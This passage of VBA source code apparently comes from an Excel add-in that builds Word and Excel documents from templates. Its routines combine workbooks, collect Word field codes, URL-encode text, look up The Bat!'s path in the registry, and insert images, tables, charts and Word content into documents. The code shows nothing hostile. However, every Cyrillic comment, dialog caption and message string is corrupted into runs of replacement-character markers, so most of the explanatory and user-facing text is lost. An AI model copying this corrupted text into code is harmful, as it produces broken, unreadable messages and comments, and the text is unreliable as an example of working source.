                    sh.Name = Left(fname$, 31)
                End If
                WB.Close False
            End If
        End If
    Next
    If commonWB.Worksheets.Count > 1 Then
        Application.DisplayAlerts = False
        commonWB.Worksheets(1).Delete

        File_Format = GetFileFormatForNewFile(NewFilename$)
        If Len(File_Format) Then
            commonWB.SaveAs NewFilename$, Val(File_Format)
        Else
            commonWB.SaveAs NewFilename$
        End If
        commonWB.Close False

        If SETT.GetBoolean("CheckBox_CombineXLS_DeleteSourceFiles") Then
            For Each filename In coll
                Kill filename
            Next
        End If

        Application.DisplayAlerts = True
        CombineXLSsheets = NewFilename$
    Else
        commonWB.Close False
    End If
End Function


' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Sub AddAbsentFieldCodes()
    On Error Resume Next
    Dim TemplatesFilenames As Collection, filename As Variant
    Set TemplatesFilenames = FilenamesCollection(TEMPLATES_FOLDER$)

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set SelectedTemplates = TemplatesFilenames
    With F_Templates
        .Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        .CommandButton_Run.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .Label_Info.Caption = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word"
        .Label_Info.Tag = "-"
        .Show
    End With
    If SelectedTemplates.Count = 0 Then Exit Sub
    Set TemplatesFilenames = SelectedTemplates

    Dim NeedWord As Boolean, WordAlreadyOpen As Boolean, msg$
    For Each filename In TemplatesFilenames
        NeedWord = NeedWord Or (TemplateType(filename) Like "DOC*")
    Next
    If Not NeedWord Then Exit Sub

    If NeedWord Then
        Set WA = GetObject(, "Word.Application")
        If WA Is Nothing Then Set WA = CreateObject("Word.Application") Else WordAlreadyOpen = True
        If WA Is Nothing Then
            msg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word," & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, Microsoft Word |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
            MsgBox msg$, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word"
            Exit Sub
        End If
        WA.Visible = False
    End If

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim coll As New Collection, code, cnt_templates&
    For Each filename In TemplatesFilenames
        If TemplateType(filename) Like "DOC*" Then cnt_templates& = cnt_templates& + 1: LoadFieldCodes_DOC filename, coll
    Next

    If Not WordAlreadyOpen Then
        WA.Quit        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Else
        WA.Visible = True
    End If
    Set WA = Nothing
    AppActivate Application.Name

    If coll.Count = 0 Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub

    Dim cell As Range, cnt_found&, cnt_new&, cnt_exist&

    cnt_found& = coll.Count
    For Each cell In SpecialCells_TypeConstants(Rows(HEADER_ROW)).Cells
        coll.Remove LCase$(CStr(cell.Text))
        If Not cell Is Nothing Then cnt_exist& = cnt_exist& + 1
    Next
    cnt_new& = coll.Count

    If coll.Count = 0 Then MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (" & cnt_found& & ") |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub

    If ActiveSheet Is Nothing Then Workbooks.Add xlWBATWorksheet
    For Each code In coll
        Set cell = Cells(HEADER_ROW, Columns.Count).End(xlToLeft)
        If cell <> "" Then Set cell = cell.Next
        cell.value = code
    Next

    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & cnt_templates& & " |fffd||fffd| " & TemplatesFilenames.Count & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & cnt_found& & ", |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & cnt_new& & vbNewLine & _
           " (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & cnt_exist& & ")" & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & cnt_new&
    MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
End Sub

Function URL_Encode2(ByVal txt) As String    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim i&, L$, t$
    For i = 1 To Len(txt)
        L = Mid(txt, i, 1)
        Select Case AscW(L)
            Case Is > 4095: t = "%" & Hex(AscW(L) \ 64 \ 64 + 224) & "%" & Hex(AscW(L) \ 64) & "%" & Hex(8 * 16 + AscW(L) Mod 64)
            Case Is > 127: t = "%" & Hex(AscW(L) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(L) Mod 64)
            Case Is <= 64: t = "%" & IIf(Len(Hex(AscW(L))) = 1, "0", "") & Hex(AscW(L))
            Case Else: t = L
        End Select
        URL_Encode2 = URL_Encode2 & t
    Next
End Function

Function URL_Encode3(ByVal txt) As String    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim i&, L$, t$
    For i = 1 To Len(txt)
        L = Mid(txt, i, 1)
        Select Case Asc(L)
            Case 0 To 64, 91 To 96, Is >= 123: t = "%" & IIf(Len(Hex(Asc(L))) = 1, "0", "") & Hex(Asc(L))
            Case Else: t = L
        End Select
        URL_Encode3 = URL_Encode3 & t
    Next
End Function

Function TheBAT_PATH() As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TheBAT!
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| TheBAT! |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    TheBAT_PATH = CreateObject("WScript.Shell").RegRead("HKEY_CURRENT_USER\Software\RIT\The Bat!\EXE path")

    If SETT.GetText("TextBox_TheBAT_Path") = "" Then
        SETT.SetText "TextBox_TheBAT_Path", TheBAT_PATH
    End If
    TheBAT_PATH = SETT.GetText("TextBox_TheBAT_Path")
    If Dir(TheBAT_PATH, vbNormal) = "" Then TheBAT_PATH = ""
End Function
Attribute VB_Name = "mod_InsertObjects"
'---------------------------------------------------------------------------------------
' Module        : mod_InsertObjects
' Author        : |fffd||fffd||fffd||fffd||fffd|                     Date: 07.07.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module

Public Const LINK_HEADER_TABLE$ = "<ExcelTable>", LINK_HEADER_CHART$ = "<ExcelChart>", COLUMN_MARK_IMAGE$ = "PasteImage", COLUMN_MARK_WORDDOC$ = "PasteWordDoc"
Public CellWithLink As Range, ExcelTablesToBeClosed As New Collection

Sub CtrlShiftT(): InsertOrEditTableLink: End Sub

Sub CtrlShiftI()
    On Error Resume Next
    If ActiveSheet Is Nothing Then Exit Sub
    Dim filename$

    If Not FolderExists(IMAGES_FOLDER$) Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        With F_Settings
            .Show
            .MultiPage_Options.value = 4
            .MultiPage_Options.Pages(4).ScrollTop = .Label_OpenImagesFolder.Top - 10
            .TextBox_ImagesFolder.BackColor = vbRed
            .CommandButton_ChangeImagesFolder.SetFocus
        End With
        Exit Sub
    End If

    filename$ = GetFilePath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", IMAGES_FOLDER$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "*.*")
    If filename$ = "" Then Exit Sub

    ActiveCell = Dir(filename$, vbNormal)
End Sub


Sub InsertOrEditTableLink()
    On Error Resume Next
    Set CellWithLink = Nothing: Set CellWithLink = ActiveCell
    If CellWithLink Is Nothing Then Exit Sub
    F_SelectTable.Show
End Sub

Function HasLinkToObject(ByVal txt$, Optional ByVal key$) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TRUE, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| txt$ |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    HasLinkToObject = (txt$ Like LINK_HEADER_TABLE$ & "*/*/*") Or (txt$ Like LINK_HEADER_CHART$ & "*/*/*") Or _
                      (key$ Like "*" & COLUMN_MARK_IMAGE$ & "*") Or (key$ Like "*" & COLUMN_MARK_WORDDOC$ & "*")
    If Trim(txt) = "" Then HasLinkToObject = False
End Function

Sub InsertObjectIntoXLS(ByRef sh As Worksheet, ByVal txt$, ByVal key$, Optional ByRef pi As ProgressIndicator)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| txt$, |fffd||fffd| |fffd||fffd||fffd||fffd| sh |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| key$
    On Error Resume Next
    Dim msg$, InsertMode$, filename$, en&, Pic As Picture
    en& = Err.Number

    Select Case True

        Case key$ Like "*" & COLUMN_MARK_IMAGE$ & "*"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

            Dim sizeW&, sizeH&, sha As Shape
            If txt Like "*|*" Then
                ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| | |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, IMG_3515.JPG|1200|1500
                ' |fffd||fffd||fffd| 1200 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| 1500 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
                sizeW& = Val(Split(txt, "|")(1))
                sizeH& = Val(Split(txt, "|")(2))
                txt = Split(txt, "|")(0)
            End If

            If txt Like "*?*.*?*" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                If txt Like "[A-Z]:\?*.?*" Then
                    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
                    filename$ = Trim(txt)
                Else
                    If Not FolderExists(IMAGES_FOLDER$) Then
                        pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                        Exit Sub
                    End If
                    filename$ = IMAGES_FOLDER$ & Trim(txt)
                End If

                If FileExists(filename$) Then

                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Excel
                    For Each sha In sh.Shapes
                        If (sha.Name = key$) Or (sha.TextFrame.Characters.Text = key$) Then
                            pi.Parent.Log "        |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Excel: " & Dir(filename$, vbNormal)
                            If sizeW& > 0 Then sha.Width = sizeW&
                            If sizeH& > 0 Then sha.Height = sizeH&
                            If sha.TextFrame.Characters.Text = key$ Then sha.TextFrame.Characters.Text = ""

                            Set Pic = sh.Pictures.Insert(filename$)    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                            ' (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| png |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

                            'Resize the picture, keeping the Width constant
                            Dim k_img As Single, k_sha As Single, newValue As Single
                            k_img = 0: k_img = Pic.Height / Pic.Width
                            k_sha = 0: k_sha = sha.Height / sha.Width

                            'Debug.Print "k_img", k_img
                            If k_img > 0 Then
                                If k_img > k_sha Then
                                    newValue = sha.Height / k_img
                                    sha.Left = sha.Left + sha.Width / 2 - newValue / 2
                                    sha.Width = newValue
                                Else
                                    newValue = sha.Width * k_img
                                    sha.Top = sha.Top + sha.Height / 2 - newValue / 2
                                    sha.Height = newValue
                                End If
                            End If

                            Pic.Delete    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

                            'Load the picture
                            sha.Fill.UserPicture filename$
                        End If
                    Next


                Else
                    pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & txt & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End If
            Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End If
    End Select
    If en& = 0 Then Err.Clear
End Sub

Sub InsertObjectIntoDOC(ByRef doc As Object, ByVal txt$, ByVal key$, Optional ByRef pi As ProgressIndicator)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| txt$, |fffd| Word-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| doc |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| key$
    On Error Resume Next
    Dim msg$, InsertMode$, filename$, myStoryRange As Object, i&

    Select Case True

        Case txt$ Like LINK_HEADER_TABLE$ & "*/*/*"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

            If Not CopyExcelTable(txt$, msg$, InsertMode$) Then
                msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & txt & vbNewLine & vbNewLine & msg$
                MsgBox msg$, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                Exit Sub
            End If

            doc.Range.Select
            With doc.Parent.Selection.Find
                .Text = key$
                While .Execute
                    Select Case InsertMode$
                        Case "Excel", ""
                            doc.Parent.Selection.PasteExcelTable False, False, False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        Case "Word"
                            doc.Parent.Selection.PasteExcelTable False, True, False        ' |fffd||fffd||fffd||fffd||fffd| Word
                        Case "PlainText"
                            doc.Parent.Selection.PasteAndFormat 22        ' (wdFormatPlainText) ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                        Case "Picture"
                            doc.Parent.Selection.PasteAndFormat 13        '(wdChartPicture) ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End Select
                Wend
            End With
            Application.CutCopyMode = False


        Case txt$ Like LINK_HEADER_CHART$ & "*/*/*"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

            If Not CopyExcelChart(txt$, msg$, InsertMode$) Then
                msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & txt & vbNewLine & vbNewLine & msg$
                MsgBox msg$, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                Exit Sub
            End If

            'doc.Parent.Visible = 1
            doc.Range.Select
            With doc.Parent.Selection.Find
                .Text = key$
                While .Execute
                    .Parent.Text = ""
                    Select Case InsertMode$
                        Case "Excel", ""
                            doc.Parent.Selection.Paste       ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        'Case "Word"
                            'doc.Parent.Selection.PasteAndFormat 15        ' (wdChartLinked)        ' |fffd||fffd||fffd||fffd||fffd| Word
                        Case "Picture"
                            doc.Parent.Selection.PasteAndFormat 13        '(wdChartPicture) ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End Select
                Wend
            End With
            Application.CutCopyMode = False


        Case key$ Like "*" & COLUMN_MARK_WORDDOC$ & "*"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word

            If Not FolderExists(WORDDOC_FOLDER$) Then
                pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Word"
                Exit Sub
            End If

            If InStr(1, txt, ".") = 0 Then        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                filename$ = "": filename$ = Dir(WORDDOC_FOLDER$ & Trim(txt) & ".*", vbNormal)
                If Len(filename$) Then txt = filename$
            End If

            If txt Like "*?*.*?*" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                filename$ = WORDDOC_FOLDER$ & Trim(txt)
                If FileExists(filename$) Then

                    Dim sourceWD As Object        ', DocText As Variant
                    Set sourceWD = doc.Parent.Documents.Open(filename$, , False, False)
                    sourceWD.Range.Copy
                    sourceWD.Close False

                    For Each myStoryRange In doc.StoryRanges
                        DoEvents
                        With myStoryRange
                            .Select
                            With doc.Parent.Selection.Find
                                .Text = key$
                                While .Execute
                                    doc.Parent.Selection.PasteAndFormat 0        ' wdPasteDefault,  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|  16 'wdFormatOriginalFormatting
                                Wend
                            End With
                        End With

                        While Not (myStoryRange.NextStoryRange Is Nothing)
                            Set myStoryRange = myStoryRange.NextStoryRange
                            With myStoryRange
                                .Select
                                With doc.Parent.Selection.Find
                                    .Text = key$
                                    While .Execute
                                        doc.Parent.Selection.PasteAndFormat 0        ' wdPasteDefault,  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|  16 'wdFormatOriginalFormatting
                                    Wend
                                End With
                            End With
                        Wend
                    Next myStoryRange

                Else
                    pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|  Word |fffd|" & txt & "|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End If
            Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word |fffd|" & txt & "|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End If


